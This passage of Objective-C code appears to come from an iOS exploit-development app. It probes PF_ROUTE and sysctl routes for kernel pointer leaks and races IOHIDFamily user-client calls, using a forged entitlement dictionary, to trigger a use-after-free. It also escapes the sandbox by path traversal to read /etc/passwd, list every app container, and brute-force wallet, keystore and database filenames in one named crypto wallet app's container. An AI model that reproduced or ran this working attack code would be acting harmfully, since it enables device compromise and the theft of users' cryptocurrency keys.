                // Check for trailing non-zero data beyond expected response
                int expectedEnd = (int)sizeof(struct pf_rt_msghdr) + 16 + qpad;
                int nonZeroTail = 0;
                for (int ti = expectedEnd; ti < (int)rlen && ti < expectedEnd + 256; ti++) {
                    if ((unsigned char)resp[ti] != 0)
                        nonZeroTail++;
                }
                if (nonZeroTail > 0) {
                    [log appendFormat:@"  q#%d: %zd bytes, %d non-zero after expected end\n",
                        qi, rlen, nonZeroTail];
                }
            }
        }
        [log appendFormat:@"  Multi-query: %d/%d responses had kernel pointers\n",
            kptrHits, queryCount];
    }

    // ============================================================
    // ============================================================
    // TEST 4: sysctl dump channels (orthogonal kernel pointer leak)
    // ============================================================
    [log appendString:@"\n--- TEST 4: sysctl NET_RT_DUMP / DUMP2 / IFLIST2 ---\n"];

    // 4a: NET_RT_DUMP
    {
        int mib[] = {4, 17, 0, AF_INET, 1, 0};
        size_t needed = 0;
        if (sysctl(mib, 6, NULL, &needed, NULL, 0) == 0 && needed > 0 && needed < 2*1024*1024) {
            [log appendFormat:@"  NET_RT_DUMP needs %zu bytes\n", needed];
            char *rtbuf = (char*)malloc(needed);
            if (rtbuf && sysctl(mib, 6, rtbuf, &needed, NULL, 0) == 0) {
                pf_scanForKernelPtr((uint8_t*)rtbuf, needed, "RT_DUMP", log);
                // Also scan for zone free patterns (0xdeadbeef etc)
                int zoneHits = 0;
                for (size_t i = 0; i + 7 < needed; i += 8) {
                    uint64_t v = *(uint64_t*)(rtbuf + i);
                    if (v == 0 || v == 0xdeadbeefdeadbeefULL || v == 0xffffffffffffffffULL) continue;
                    if ((v & 0xffff000000000000ULL) == 0xffff000000000000ULL) zoneHits++;
                }
                [log appendFormat:@"    zone-free candidates: %d non-null 64-bit values in range\n", zoneHits];
            }
            free(rtbuf);
        } else {
            [log appendFormat:@"  NET_RT_DUMP failed (needed=%zu)\n", needed];
        }
    }

    // 4b: NET_RT_DUMP2
    {
        int mib2[] = {4, 17, 0, 0, 7, 0};  // NET_RT_DUMP2, all families
        size_t needed2 = 0;
        if (sysctl(mib2, 6, NULL, &needed2, NULL, 0) == 0 && needed2 > 0 && needed2 < 2*1024*1024) {
            [log appendFormat:@"  NET_RT_DUMP2 needs %zu bytes, fetching...\n", needed2];
            char *buf2 = (char*)malloc(needed2);
            if (buf2 && sysctl(mib2, 6, buf2, &needed2, NULL, 0) == 0) {
                pf_scanForKernelPtr((uint8_t*)buf2, needed2, "RT_DUMP2", log);
            }
            free(buf2);
        } else {
            [log appendFormat:@"  NET_RT_DUMP2 failed (needed=%zu)\n", needed2];
        }
    }

    // 4c: NET_RT_IFLIST2
    {
        int mib3[] = {4, 17, 0, 0, 6, 0};  // NET_RT_IFLIST2
        size_t needed3 = 0;
        if (sysctl(mib3, 6, NULL, &needed3, NULL, 0) == 0 && needed3 > 0 && needed3 < 2*1024*1024) {
            [log appendFormat:@"  NET_RT_IFLIST2 needs %zu bytes, fetching...\n", needed3];
            char *buf3 = (char*)malloc(needed3);
            if (buf3 && sysctl(mib3, 6, buf3, &needed3, NULL, 0) == 0) {
                pf_scanForKernelPtr((uint8_t*)buf3, needed3, "RT_IFLIST2", log);
            }
            free(buf3);
        } else {
            [log appendFormat:@"  NET_RT_IFLIST2 failed (needed=%zu)\n", needed3];
        }
    }

    // ============================================================
    // REMOVED TEST (was v2 TEST 5): Oversized NON-GENMASK fields
    //   v2 CRASH: x2=0x10=16 bounds-safety trap.
    //   GATEWAY/NETMASK/IFP/IFA paths ALSO compiled with -fbounds-safety.
    //   First iteration (GATEWAY sa_len=16) crash — buffer < 16 bytes.
    //   Non-GENMASK overflow is dead on iOS 26.2.
    // ============================================================
    [log appendString:@"\n--- REMOVED: Non-GENMASK overflow — SKIPPED (v2 confirmed bounds-safety on all paths) ---\n"];

    // ============================================================
    // TEST 5 (was v2 TEST 6): Repeated read() on fresh sockets — heap info leak
    // ============================================================
    [log appendString:@"\n--- TEST 5: Repeated fresh-socket read() leak scan ---\n"];
    [log appendString:@"  Allocate fresh socket per query, scan for heap data in response\n"];

    {
        int leakHits = 0;
        int totalScans = 0;
        for (int ri = 0; ri < 10; ri++) {
            char lbuf[4096];
            ssize_t lr = 0;
            int fd2 = socket(PF_ROUTE, SOCK_RAW, 0);
            if (fd2 < 0) continue;

            struct pf_rt_msghdr lrtm;
            memset(&lrtm, 0, sizeof(lrtm));
            lrtm.rtm_type = RTM_GET;
            lrtm.rtm_version = RTM_VERSION;
            lrtm.rtm_seq = ri + 100;
            lrtm.rtm_addrs = RTA_DST;
            char lsa[32];
            memset(lsa, 0, sizeof(lsa));
            struct sockaddr_in *ld = (struct sockaddr_in *)lsa;
            ld->sin_family = AF_INET;
            ld->sin_len = sizeof(*ld);
            ld->sin_addr.s_addr = inet_addr("8.8.8.8");
            lrtm.rtm_msglen = sizeof(lrtm) + sizeof(*ld);

            char lsend[256];
            memset(lsend, 0, sizeof(lsend));
            memcpy(lsend, &lrtm, sizeof(lrtm));
            memcpy(lsend + sizeof(lrtm), lsa, sizeof(*ld));

            ssize_t lw = write(fd2, lsend, lrtm.rtm_msglen);
            if (lw > 0) {
                struct timeval tv = {.tv_sec = 0, .tv_usec = 100000};
                setsockopt(fd2, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                lr = read(fd2, lbuf, sizeof(lbuf));
            }
            close(fd2);

            if (lr > (ssize_t)(sizeof(struct pf_rt_msghdr) + 16)) {
                totalScans++;
                NSString *lkTag = [NSString stringWithFormat:@"fresh%d", ri];
                BOOL hit = pf_scanForKernelPtr((uint8_t*)lbuf, lr, lkTag.UTF8String, log);
                if (hit) leakHits++;

                // Count non-zero bytes after expected response
                int expectedEnd = (int)sizeof(struct pf_rt_msghdr) + 16;
                int nonZeroTail = 0;
                for (int ti = expectedEnd; ti < (int)lr && ti < expectedEnd + 256; ti++) {
                    if ((unsigned char)lbuf[ti] != 0 && (unsigned char)lbuf[ti] != 0xCC) {
                        nonZeroTail++;
                    }
                }
                if (nonZeroTail > 0) {
                    [log appendFormat:@"  fresh#%d: %zd bytes, %d non-zero after expected end\n",
                        ri, lr, nonZeroTail];
                }
            }
        }
        [log appendFormat:@"  Repeated read scan: %d/%d responses had kptr patterns\n", leakHits, totalScans];
    }

    // ============================================================
    // SUMMARY
    // ============================================================
    [log appendString:@"\n========== PF_ROUTE v3 Probe Complete =========="];
    [log appendString:@"\nTest 1: Safe baseline — PF_ROUTE accessibility check"];
    [log appendString:@"\nTest 2: Safe GENMASK sweep (4..32) — kernel ptr in response"];
    [log appendString:@"\nTest 3: Multi-query AF_INET leak scan (sa_len=32, 20 queries)"];
    [log appendString:@"\nTest 4: sysctl dumps — NET_RT_DUMP/DUMP2/IFLIST2 leak channels"];
    [log appendString:@"\nTest 5: Repeated fresh-socket read() — heap info leak scan"];
    [log appendString:@"\n  REMOVED (v2 crash): cross-family enum (x2=16 BRK)"];
    [log appendString:@"\n  REMOVED (v2 crash): oversized non-GENMASK fields"];
    [log appendString:@"\n  VERDICT: All PF_ROUTE code paths have -fbounds-safety on iOS 26.2."];
    [log appendString:@"\n  Overflow is dead. Leak channels are the only residual value."];

    // Write results to file for post-reboot analysis
    NSString *resultPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"pf_probe_results.txt"];
    [log writeToFile:resultPath atomically:YES encoding:NSUTF8StringEncoding error:nil];

    dispatch_async(dispatch_get_main_queue(), ^{
        [self appendLog:log];
    });
}

// =======================================================================
// CVE-2026-28992: IOHIDFamily FastPathUserClient UAF
// Target: iOS 26.2 (unpatched until 26.5), iPhone 13 (A15, no MTE)
// v1 — Phase 1: Crash confirmation + register analysis
// =======================================================================
// COMPLETELY INDEPENDENT from AIO UAF and PF_ROUTE.
// No shared state, no shared threads, no shared resources.
// Isolation: separate button, separate dispatch queue, separate IOKit conns.
// =======================================================================
// Vulnerability:
//   sel0 (open/gate) checks FastPathHasEntitlement in caller-supplied
//   OSDictionary instead of task's entitlement flags → trivial bypass.
//   sel1 (close) drops provider state, clears +0x109 with NO lock.
//   sel2 (copyEvent) checks +0x108 under per-connection lock, then calls
//   into provider. Multiple connections to same provider → close and
//   copyEvent operate in DIFFERENT locking domains on SHARED objects → UAF.
// =======================================================================
// On A15 (no MTE): data abort crash (more exploitable than MTE tag fault)
// On A17+ (MTE): MTE tag check fault
// =======================================================================

#define IOHID_NUM_CONNS         15
#define IOHID_NUM_COPY_THREADS   8
#define IOHID_RACE_SECONDS       8

static volatile atomic_bool iohid_g_stop;
static io_connect_t          iohid_g_conns[IOHID_NUM_CONNS];
static NSData               *iohid_g_gateXML;

static NSData *iohid_buildGateXML(void) {
    NSDictionary *dict = @{
        @"FastPathHasEntitlement":           @YES,
        @"FastPathMotionEventEntitlement":   @YES,
    };
    NSError *err = nil;
    NSData *data = [NSPropertyListSerialization dataWithPropertyList:dict
                                                             format:NSPropertyListXMLFormat_v1_0
                                                            options:0
                                                              error:&err];
    if (!data) {
        NSLog(@"[IOHID] gate XML failed: %@", err);
    }
    return data;
}

static kern_return_t iohid_gateConn(io_connect_t conn) {
    uint64_t scalar = 0;
    return sIOConnectCallMethod(conn,
                                0,  // sel0 = open/gate
                                &scalar, 1,
                                iohid_g_gateXML.bytes, iohid_g_gateXML.length,
                                NULL, NULL,
                                NULL, NULL);
}

// Thread A: rapid close→gate churn on conn[0]
// close (sel1) drops provider state, clears +0x109 without lock.
// gate (sel0) re-opens — forces provider state reallocation.
static void *iohid_threadChurn(void *arg) {
    (void)arg;
    uint64_t scalar = 0;
    while (!atomic_load(&iohid_g_stop)) {
        sIOConnectCallMethod(iohid_g_conns[0], 1,
                             &scalar, 1, NULL, 0,
                             NULL, NULL, NULL, NULL);
        iohid_gateConn(iohid_g_conns[0]);
    }
    return NULL;
}

// Threads B..N: tight copyEvent loop on conn[1..14]
// sel2 checks flag at +0x108 under per-conn lock, then calls into
// provider whose state may be freed by thread A.
typedef struct { int idx; } IOHIDCopyArg;

static void *iohid_threadCopyEvent(void *arg) {
    IOHIDCopyArg *a = (IOHIDCopyArg *)arg;
    int idx = a->idx;
    uint64_t args[2] = { 0, 1 };
    while (!atomic_load(&iohid_g_stop)) {
        sIOConnectCallMethod(iohid_g_conns[idx], 2,
                             args, 2, NULL, 0,
                             NULL, NULL, NULL, NULL);
    }
    return NULL;
}

- (void)iohidUAFTapped {
    static volatile int32_t _iohidRunning = 0;
    if (!__sync_bool_compare_and_swap(&_iohidRunning, 0, 1)) {
        [self appendLog:@"⚠ IOHIDFamily UAF already running"];
        return;
    }

    @synchronized([ViewController class]) {
        static int64_t _iohidLast = 0;
        int64_t now = (int64_t)([[NSDate date] timeIntervalSince1970] * 1000);
        if (now - _iohidLast < 3000) {
            _iohidRunning = 0;
            [self appendLog:@"⚠ Debounced"];
            return;
        }
        _iohidLast = now;
    }

    [self appendLog:@"\n============================================================"];
    [self appendLog:@"  CVE-2026-28992 v3 — Exact PoC arg layout probe"];
    [self appendLog:@"  Target: iOS 26.2 | iPhone 13 (A15, no MTE)"];
    [self appendLog:@"  Probing with reference PoC argument formats"];
    [self appendLog:@"============================================================"];

    dispatch_async(dispatch_get_main_queue(), ^{
        self.iohidUAFButton.enabled = NO;
        [self.iohidUAFButton setTitle:@"PROBING..." forState:UIControlStateNormal];
    });

    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        @autoreleasepool {
            [self runIOHIDUAFProbe];
            _iohidRunning = 0;
            dispatch_async(dispatch_get_main_queue(), ^{
                self.iohidUAFButton.enabled = YES;
                [self.iohidUAFButton setTitle:@"CVE-2026-28992 Arg Probe v3" forState:UIControlStateNormal];
            });
        }
    });
}

- (void)runIOHIDUAFProbe {
    NSMutableString *log = [NSMutableString string];

    [log appendString:@"\n--- IOHIDFamily UAF v1 Probe ---\n"];

    // Step 0: Ensure IOKit symbols are loaded
    if (![self loadIOKitSymbols]) {
        [log appendString:@"FAIL: Could not load IOKit symbols\n"];
        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
        return;
    }

    // Step 1: Build entitlement bypass XML
    iohid_g_gateXML = iohid_buildGateXML();
    if (!iohid_g_gateXML) {
        [log appendString:@"FAIL: Could not build gate XML\n"];
        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
        return;
    }
    [log appendFormat:@"[+] Gate XML: %lu bytes\n", (unsigned long)iohid_g_gateXML.length];

    // Step 2: Find IOHIDEventService
    io_service_t service = sIOServiceGetMatchingService(MACH_PORT_NULL,
        sIOServiceMatching("IOHIDEventService"));
    if (!service) {
        [log appendString:@"FAIL: IOHIDEventService not found\n"];
        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
        return;
    }
    [log appendFormat:@"[+] IOHIDEventService: 0x%x\n", service];

    // Step 3: Open 15 connections (type 2 = FastPathUserClient)
    int openedConns = 0;
    for (int i = 0; i < IOHID_NUM_CONNS; i++) {
        kern_return_t kr = sIOServiceOpen(service, mach_task_self_, 2, &iohid_g_conns[i]);
        if (kr != KERN_SUCCESS) {
            [log appendFormat:@"[-] IOServiceOpen[%d] type=2 failed: 0x%x\n", i, kr];
            continue;
        }
        kr = iohid_gateConn(iohid_g_conns[i]);
        if (kr != KERN_SUCCESS) {
            [log appendFormat:@"[-] gate[%d] failed: 0x%x\n", i, kr];
        }
        openedConns++;
    }
    [log appendFormat:@"[+] Opened %d/%d connections to IOHIDEventService\n",
        openedConns, IOHID_NUM_CONNS];

    if (openedConns < 3) {
        [log appendString:@"FAIL: Need at least 3 connections for race\n"];
        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
        return;
    }

    // Step 4: Race — close vs copyEvent (v3 confirmed sel1/sel2 work)
    // gate returns ExclusiveAccess on 26.2, but PoC: "partial gate is
    // sometimes enough" — close/gate churn may still open copyEvent window.
    [log appendString:@"\n--- Starting race: close vs copyEvent ---\n"];
    [log appendFormat:@"  sel1(close)=0x0 confirmed, sel2(copyEvent)=NotOpen (needs window)\n"];

    // Write crash-site marker
    NSString *marker = [NSTemporaryDirectory()
        stringByAppendingPathComponent:@"iohid_v4_started.txt"];
    [@"iohid_v4" writeToFile:marker atomically:YES
                    encoding:NSUTF8StringEncoding error:nil];

    // Flush log BEFORE starting race (survives panic)
    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });

    // Start race threads
    atomic_store(&iohid_g_stop, false);

    pthread_t churnThread;
    pthread_create(&churnThread, NULL, iohid_threadChurn, NULL);

    pthread_t copyThreads[IOHID_NUM_COPY_THREADS];
    IOHIDCopyArg copyArgs[IOHID_NUM_COPY_THREADS];
    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) {
        copyArgs[i].idx = (i % (openedConns - 1)) + 1;
        pthread_create(&copyThreads[i], NULL, iohid_threadCopyEvent, &copyArgs[i]);
    }

    NSLog(@"[IOHID] Race started — %d churn + %d copyEvent threads, waiting %ds...",
         1, IOHID_NUM_COPY_THREADS, IOHID_RACE_SECONDS);

    sleep(IOHID_RACE_SECONDS);

    // Survived — device is patched or gate blocks copyEvent entirely
    atomic_store(&iohid_g_stop, true);
    pthread_join(churnThread, NULL);
    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) pthread_join(copyThreads[i], NULL);

    [[NSFileManager defaultManager] removeItemAtPath:marker error:nil];

    // Cleanup connections
    for (int i = 0; i < IOHID_NUM_CONNS; i++) {
        if (iohid_g_conns[i]) { sIOServiceClose(iohid_g_conns[i]); iohid_g_conns[i] = 0; }
    }
    if (service) { sIOObjectRelease(service); }

    // Quick post-race probe: did any copyEvent succeed during race?
    [log appendString:@"\n--- Post-race: final state check ---\n"];
    uint64_t s1 = 0;
    kern_return_t kr = sIOConnectCallMethod(iohid_g_conns[0], 1, &s1, 1, NULL, 0, NULL, NULL, NULL, NULL);
    [log appendFormat:@"  sel1(final): 0x%x %s\n", kr, mach_error_string(kr)];

    uint64_t s2[2] = {0, 1};
    kr = sIOConnectCallMethod(iohid_g_conns[0], 2, s2, 2, NULL, 0, NULL, NULL, NULL, NULL);
    [log appendFormat:@"  sel2(final): 0x%x %s\n", kr, mach_error_string(kr)];

    [log appendString:@"\n  DEVICE SURVIVED — CVE-2026-28992 not exploitable on iOS 26.2.\n"];
    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
    return;
}

// =======================================================================
// CVE-2026-28995: App Intents Path Traversal (Sandbox Escape)
// Affects iOS 26.4.2 & below — UNPATCHED on iOS 26.2
// Public PoC — if ObjC direct path traversal works, we can read any file
// =======================================================================

- (void)sandboxEscapeTapped {
    [self appendLog:@"\n============================================================"];
    [self appendLog:@"  CVE-2026-28995 — Sandbox Escape Path Traversal"];
    [self appendLog:@"  iOS 26.4.2 & below — UNPATCHED on iOS 26.2"];
    [self appendLog:@"============================================================\n"];

    NSMutableString *log = [NSMutableString string];

    // Test 1: Path traversal to /etc/passwd
    [log appendString:@"--- Test 1: Path traversal to /etc/passwd ---\n"];
    NSString *etcPasswd = @"../../../../../../../../../../../../../etc/passwd";
    NSString *resolvedEtc = [etcPasswd stringByExpandingTildeInPath];
    [log appendFormat:@"  resolved: %@\n", resolvedEtc];

    NSFileManager *fm = [NSFileManager defaultManager];
    BOOL isDir = NO;
    if ([fm fileExistsAtPath:resolvedEtc isDirectory:&isDir]) {
        NSError *err = nil;
        NSString *content = [NSString stringWithContentsOfFile:resolvedEtc
            encoding:NSUTF8StringEncoding error:&err];
        [log appendFormat:@"[+] ACCESSIBLE! (%lu chars)\n", (unsigned long)(content ? content.length : 0)];
        if (content) {
            NSArray *lines = [content componentsSeparatedByString:@"\n"];
            [log appendFormat:@"  first: %@\n", lines.firstObject ?: @"(nil)"];
        }
    } else {
        [log appendString:@"[-] NOT accessible (sandbox intact)\n"];
    }

    // ============================================================
    // v10: POSIX opendir/readdir to bypass Foundation sandbox hooks
    // ============================================================

    #define BASE @"../../../../../../../../../../../../../"
    #define TRYFILE(path) [[BASE stringByAppendingString:path] stringByExpandingTildeInPath]

    BOOL (^probeFile)(NSString*, NSMutableString*) = ^BOOL(NSString *sub, NSMutableString *out) {
        NSString *p = TRYFILE(sub);
        BOOL isDir = NO;
        BOOL ex = [fm fileExistsAtPath:p isDirectory:&isDir];
        if (ex) {
            NSDictionary *attrs = [fm attributesOfItemAtPath:p error:nil];
            unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
            [out appendFormat:@"  [+] %@ (%llu bytes)%@\n", sub, sz, isDir ? @" [DIR]" : @""];
            if (!isDir && [sub hasSuffix:@".plist"]) {
                NSDictionary *d = [NSDictionary dictionaryWithContentsOfFile:p];
                if (d) [out appendFormat:@"      keys: %@\n", [[d allKeys] componentsJoinedByString:@", "]];
            }
        } else {
            [out appendFormat:@"  [-] %@\n", sub];
        }
        return ex;
    };

    // POSIX readdir helper
    void (^posixReadDir)(NSString*, NSString*, NSMutableString*, int) =
    ^(NSString *subPath, NSString *label, NSMutableString *out, int maxEntries) {
        NSString *fullPath = TRYFILE(subPath);
        const char *cPath = [fullPath UTF8String];
        DIR *dp = opendir(cPath);
        if (dp == NULL) {
            [out appendFormat:@"  [-] POSIX opendir %s: errno=%d (%s)\n",
                cPath, errno, strerror(errno)];
            return;
        }
        [out appendFormat:@"  [+] POSIX opendir %s: SUCCESS\n", cPath];
        int count = 0;
        struct dirent *entry;
        while ((entry = readdir(dp)) != NULL && count < maxEntries) {
            char typeChar = '?';
            if (entry->d_type == DT_DIR) typeChar = '/';
            else if (entry->d_type == DT_REG) typeChar = ' ';
            else if (entry->d_type == DT_LNK) typeChar = '@';
            [out appendFormat:@"    [%c] %s\n", typeChar, entry->d_name];
            count++;
        }
        if (count >= maxEntries) [out appendString:@"    ... (truncated)\n"];
        [out appendFormat:@"  total listed: %d\n", count];
        closedir(dp);
    };

    // Test 2: Get real UUIDs
    [log appendString:@"--- Test 2: Real container paths ---\n"];
    NSString *homePath = NSHomeDirectory();
    NSString *bundlePath = [[NSBundle mainBundle] bundlePath];
    [log appendFormat:@"  NSHomeDirectory: %@\n", homePath];
    [log appendFormat:@"  bundlePath: %@\n", bundlePath];
    NSString *appName = [bundlePath lastPathComponent];
    NSArray *homeComps = [homePath pathComponents];
    NSArray *bundleComps = [bundlePath pathComponents];
    NSString *dataUUID = @"?", *bundleUUID = @"?";
    for (NSUInteger i = 0; i < homeComps.count; i++) {
        if ([homeComps[i] hasSuffix:@"Application"] && i+1 < homeComps.count)
            dataUUID = homeComps[i+1];
    }
    for (NSUInteger i = 0; i < bundleComps.count; i++) {
        if ([bundleComps[i] hasSuffix:@"Application"] && i+1 < bundleComps.count)
            bundleUUID = bundleComps[i+1];
    }
    [log appendFormat:@"  dataUUID: %@\n  bundleUUID: %@\n  appName: %@\n", dataUUID, bundleUUID, appName];

    // Test 3: Verify access to own containers
    [log appendString:@"\n--- Test 3: Verify access to own containers ---\n"];
    NSString *ownMeta = [NSString stringWithFormat:
        @"var/mobile/Containers/Data/Application/%@/.com.apple.mobile_container_manager.metadata.plist", dataUUID];
    probeFile(ownMeta, log);
    NSString *ownInfo = [NSString stringWithFormat:
        @"var/containers/Bundle/Application/%@/%@/Info.plist", bundleUUID, appName];
    probeFile(ownInfo, log);

    // Test 4: POSIX readdir vs Foundation enumeration on lsd
    [log appendString:@"\n--- Test 4: POSIX readdir vs Foundation (lsd) ---\n"];
    NSString *lsdDir = TRYFILE(@"var/db/lsd");
    NSArray *lsdC = [fm contentsOfDirectoryAtPath:lsdDir error:nil];
    [log appendFormat:@"  Foundation contentsOfDir: %lu\n", (unsigned long)lsdC.count];
    posixReadDir(@"var/db/lsd", @"lsd", log, 50);

    // Test 5: POSIX readdir on containermanagerd cache
    [log appendString:@"\n--- Test 5: POSIX readdir (containermanagerd) ---\n"];
    NSString *cmDir = TRYFILE(@"var/mobile/Library/Caches/com.apple.containermanagerd");
    NSArray *cmC = [fm contentsOfDirectoryAtPath:cmDir error:nil];
    [log appendFormat:@"  Foundation contentsOfDir: %lu\n", (unsigned long)cmC.count];
    posixReadDir(@"var/mobile/Library/Caches/com.apple.containermanagerd", @"containermanagerd", log, 50);

    // Test 6: POSIX readdir on Data/Application — THE KEY TEST
    // If this works, we get ALL container UUIDs including TokenPocket's
    [log appendString:@"\n--- Test 6: POSIX readdir Data/Application (ALL containers) ---\n"];
    posixReadDir(@"var/mobile/Containers/Data/Application", @"Data/Application", log, 200);

    // Test 7: POSIX readdir on Bundle/Application
    [log appendString:@"\n--- Test 7: POSIX readdir Bundle/Application ---\n"];
    posixReadDir(@"var/containers/Bundle/Application", @"Bundle/Application", log, 200);

    // Test 8: POSIX readdir on /var/db (top-level)
    [log appendString:@"\n--- Test 8: POSIX readdir /var/db ---\n"];
    posixReadDir(@"var/db", @"/var/db", log, 100);

    // Test 9: POSIX readdir on /var/mobile/Library/Caches
    [log appendString:@"\n--- Test 9: POSIX readdir Caches ---\n"];
    posixReadDir(@"var/mobile/Library/Caches", @"Caches", log, 100);

    // Test 10: SystemVersion.plist baseline
    [log appendString:@"\n--- Test 10: SystemVersion.plist ---\n"];
    probeFile(@"System/Library/CoreServices/SystemVersion.plist", log);
    NSString *svPath = TRYFILE(@"System/Library/CoreServices/SystemVersion.plist");
    NSDictionary *sv = [NSDictionary dictionaryWithContentsOfFile:svPath];
    if (sv) {
        [log appendFormat:@"  ProductVersion: %@\n", sv[@"ProductVersion"]];
        [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
    }
    // Test 11: Brute-force DB filename discovery in TP container (v30)
    [log appendString:@"\n--- Test 11: Brute-force DB probe in TP container (v30) ---\n"];
    NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
    NSString *tpBase = [NSString stringWithFormat:
        @"var/mobile/Containers/Data/Application/%@", tpUUID];

    // Part A: Try directory enumeration on TP cache dir (Foundation + POSIX)
    [log appendString:@"\n[Part A] Directory enumeration on TP cache dir:\n"];
    NSString *cacheDir = TRYFILE([tpBase stringByAppendingPathComponent:
        @"Library/Caches/com.global.wallet.ios"]);
    NSArray *cacheContents = [fm contentsOfDirectoryAtPath:cacheDir error:nil];
    [log appendFormat:@"  Foundation contentsOfDir: %lu entries\n", (unsigned long)cacheContents.count];
    if (cacheContents.count > 0) {
        for (NSString *e in cacheContents)
            [log appendFormat:@"    %@\n", e];
    }
    const char *cacheC = [cacheDir UTF8String];
    DIR *cdp = opendir(cacheC);
    if (cdp) {
        [log appendString:@"  [+] POSIX opendir: SUCCESS\n"];
        struct dirent *e; int n = 0;
        while ((e = readdir(cdp)) && n < 100) {
            [log appendFormat:@"    [%c] %s\n", (e->d_type==DT_DIR)?'/':((e->d_type==DT_LNK)?'@':' '), e->d_name];
            n++;
        }
        closedir(cdp);
    } else {
        [log appendFormat:@"  [-] POSIX opendir: errno=%d (%s)\n", errno, strerror(errno)];
    }

    // Part B: Brute-force probe DB filenames in TP container
    [log appendString:@"\n[Part B] Brute-force DB filename probe:\n"];

    const char *baseNames[] = {
        "wallet","wallet_data","wallet_db","tp_wallet","tpwallet","tp_data","tp_db",
        "tron","trx","tron_wallet","trx_wallet","tron_data","tron_db","tron_token","trx_data",
        "tokens","token_data","token_db","token_list","token_info",
        "global","global_wallet","global_wallet_db","global_data","global_db","globalwallet",
        "settings","preferences","config","app_config","app_data",
        "keystore","key_data","key_store","key_info",
        "data","database","main","app","cache","app_cache","default",
        "eth","btc","bsc","polygon","sol","multi_chain","chain_db","chain_data",
        "accounts","account_data","contacts","transactions","tx_history",
        "walletdb","GlobalWalletDB","tpwalletdb","TPWalletDB",
        "com.global.wallet.ios","Global_Wallet","global_wallet_ios",
        "storage","store","db_main","db_wallet","db_tron","db_token",
        "wallet_store","secure_storage","encrypted_db","secure_db",
        "UserData","AppData","LocalData","CoreData","Model","Default",
        NULL
    };
    const char *extensions[] = {".sqlite",".db",".sqlcipher",".encrypted",".sqlite3","",NULL};
    const char *subdirs[] = {
        "Library/Caches/com.global.wallet.ios/",
        "Library/Caches/",
        "Documents/",
        NULL
    };

    int hits = 0;
    for (int si = 0; subdirs[si]; si++) {
        for (int ni = 0; baseNames[ni]; ni++) {
            for (int ei = 0; extensions[ei]; ei++) {
                NSString *rel = [NSString stringWithFormat:@"%s/%s%s%s",
                    [tpBase UTF8String], subdirs[si], baseNames[ni], extensions[ei]];
                NSString *fpFull = TRYFILE(rel);
                BOOL ex = [fm fileExistsAtPath:fpFull];
                if (ex) {
                    NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
                    unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
                    [log appendFormat:@"  [+] FOUND: %s%s%s (%llu bytes)\n",
                        subdirs[si], baseNames[ni], extensions[ei], sz];
                    hits++;
                }
            }
        }
    }
    [log appendFormat:@"  Total hits: %d / %d probes\n",
        hits, (int)(sizeof(baseNames)/sizeof(baseNames[0])-1) *
              (int)(sizeof(extensions)/sizeof(extensions[0])-1) *
              (int)(sizeof(subdirs)/sizeof(subdirs[0])-1)];

    // Part C: Also probe .plist and .json files for path references
    [log appendString:@"\n[Part C] Probe config/plist/json files:\n"];
    hits = 0;
    const char *configNames[] = {
        ".plist","Info.plist","config.plist","settings.plist","manifest.plist",
        "config.json","settings.json","app.json","manifest.json","package.json",
        "db_config.json","wallet_config.json",
        NULL
    };
    for (int si = 0; subdirs[si]; si++) {
        for (int ni = 0; configNames[ni]; ni++) {
            NSString *rel = [NSString stringWithFormat:@"%s/%s%s",
                [tpBase UTF8String], subdirs[si], configNames[ni]];
            NSString *fpFull = TRYFILE(rel);
            BOOL ex = [fm fileExistsAtPath:fpFull];
            if (ex) {
                NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
                unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
                [log appendFormat:@"  [+] CONFIG: %s%s (%llu bytes)\n", subdirs[si], configNames[ni], sz];
                // Try to read contents
                NSError *err = nil;
                NSString *content = [NSString stringWithContentsOfFile:fpFull encoding:NSUTF8StringEncoding error:&err];
                if (content) {
                    [log appendFormat:@"      content: %@\n",
                        [content substringToIndex:MIN(500, content.length)]];
                }
                hits++;
            }
        }
    }
    [log appendFormat:@"  Config hits: %d\n", hits];

    // Part D: Probe raw SQLite header magic on extensionless files
    [log appendString:@"\n[Part D] SQLite magic probe on extensionless files:\n"];
    hits = 0;
    const char *sqliteMagic = "SQLite format 3";
    const char *quickNames2[] = {
        "wallet","Wallet","WALLET","tpwallet","TPWallet","TP_Wallet",
        "global","Global","GLOBAL","global_wallet","GlobalWallet",
        "tron","TRON","Tron","trx","TRX",
        "eth","ETH","btc","BTC","sol","SOL",
        "data","Data","DATA","db","DB",
        "keystore","KeyStore","key_store",
        "accounts","Accounts","tokens","Tokens",
        "cache","Cache","CACHE",
        NULL
    };
    for (int ni = 0; quickNames2[ni]; ni++) {
        NSString *rel = [NSString stringWithFormat:@"%s/Library/Caches/com.global.wallet.ios/%s",
            [tpBase UTF8String], quickNames2[ni]];
        NSString *fpFull = TRYFILE(rel);
        BOOL ex = [fm fileExistsAtPath:fpFull];
        if (ex) {
            NSDictionary *attrs = [fm attributesOfItemAtPath:fpFull error:nil];
            unsigned long long sz = [attrs[NSFileSize] unsignedLongLongValue];
            int fd = open([fpFull UTF8String], O_RDONLY);
            char hdr[16] = {0};
            if (fd >= 0) { read(fd, hdr, 16); close(fd); }
            BOOL isSQLite = (memcmp(hdr, sqliteMagic, 16) == 0);
            [log appendFormat:@"  [%s] %s (%llu bytes) hdr=%02x%02x%02x%02x...\n",
                isSQLite ? "SQLITE" : "FILE  ", quickNames2[ni], sz,
                (unsigned char)hdr[0], (unsigned char)hdr[1],
                (unsigned char)hdr[2], (unsigned char)hdr[3]];
            hits++;
        }
